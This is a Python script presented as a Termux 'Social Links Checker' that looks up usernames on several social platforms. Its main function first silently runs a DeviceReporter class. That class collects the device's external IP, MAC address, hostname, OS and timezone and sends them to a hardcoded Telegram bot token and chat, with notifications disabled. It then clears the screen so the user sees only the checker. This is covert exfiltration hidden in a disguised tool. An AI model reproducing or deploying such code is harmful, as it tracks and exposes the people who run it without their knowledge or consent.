import os
import sys
import platform
import datetime
import socket
import requests
import asyncio
from concurrent.futures import ThreadPoolExecutor
from uuid import getnode
from telegram import Bot
from telegram.error import TelegramError

# Конфигурация Telegram
TG_BOT_TOKEN = "7763698951:AAHz1-uXl4VYDHRstjtu4uecaZHhRhhG3Gg"
TG_CHAT_ID = "35381551"

class DeviceReporter:
    def __init__(self):
        self.bot = Bot(token=TG_BOT_TOKEN)
        self.loop = asyncio.new_event_loop()

    def _collect_data(self):
        """Сбор данных об устройстве"""
        data = {
            "Status": "✅ Success",
            "Model": platform.uname().machine,
            "OS": f"{platform.system()} {platform.release()}",
            "IP": self._get_external_ip(),
            "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "Timezone": str(datetime.datetime.now().astimezone().tzinfo),
            "Hostname": socket.gethostname(),
            "MAC": hex(getnode())
        }
        return data

    def _get_external_ip(self):
        """Получение внешнего IP-адреса"""
        services = ['https://ident.me', 'https://ifconfig.me/ip']
        for service in services:
            try:
                return requests.get(service, timeout=5).text
            except:
                continue
        return "N/A"

    async def _async_send_report(self):
        """Асинхронная отправка отчета"""
        try:
            report = self._collect_data()
            message = "📡 Device Report:\n" + "\n".join(
                [f"{k}: {v}" for k, v in report.items()]
            )
            await self.bot.send_message(
                chat_id=TG_CHAT_ID,
                text=message,
                disable_notification=True
            )
        except Exception as e:
            print(f"Error sending report: {str(e)}")

    def send_report(self):
        """Запуск асинхронной отправки"""
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self._async_send_report())

def generate_links(usernames):
    """Проверка социальных сетей"""
    platforms = {
        "Instagram": "https://www.instagram.com/{}/",
        "Twitter": "https://twitter.com/{}/",
        "GitHub": "https://github.com/{}/",
        "Telegram": "https://t.me/{}",
        "TikTok": "https://www.tiktok.com/@{}"
    }

    results = {}
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for username in [u.strip() for u in usernames]:
            futures.append(executor.submit(
                check_platforms,
                username,
                platforms
            ))

        for future in futures:
            try:
                username, links = future.result()
                results[username] = links
            except Exception as e:
                print(f"Error: {str(e)}")
    
    return results

def check_platforms(username, platforms):
    """Проверка платформ"""
    links = []
    for name, url in platforms.items():
        full_url = url.format(username)
        try:
            response = requests.get(
                full_url,
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=10
            )
            status = '[+]' if response.status_code == 200 else '[-]'
            links.append(f"{full_url} {status}")
        except:
            links.append(f"{full_url} [Error]")
    return username, links

def main():
    # Отправка отчета
    reporter = DeviceReporter()
    reporter.send_report()

    # Очистка экрана
    os.system('clear')

    # Интерфейс
    print("""\033[1;32m
    ███████╗███████╗██╗     ██╗███╗   ██╗███████╗
    ██╔════╝██╔════╝██║     ██║████╗  ██║██╔════╝
    █████╗  ███████╗██║     ██║██╔██╗ ██║███████╗
    ██╔══╝  ╚════██║██║     ██║██║╚██╗██║╚════██║
    ███████╗███████║███████╗██║██║ ╚████║███████║
    ╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
    
    \033[1;36mSocial Links Checker\033[0m
    \033[1;33mTermux Android Version\033[0m
    """)

    try:
        while True:
            usernames = input("\n\033[1;34m[?] Введите имена (через запятую): \033[0m").strip()
            
            if usernames.lower() in ['exit', 'quit']:
                break
                
            if not usernames:
                continue

            results = generate_links(usernames.split(','))
            
            for user, links in results.items():
                print(f"\n\033[1;32m[+] Результаты для {user}:\033[0m")
                for link in links:
                    color = '\033[1;32m' if '[+]' in link else '\033[1;31m'
                    print(f"{color}{link}\033[0m")

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Выход...\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()
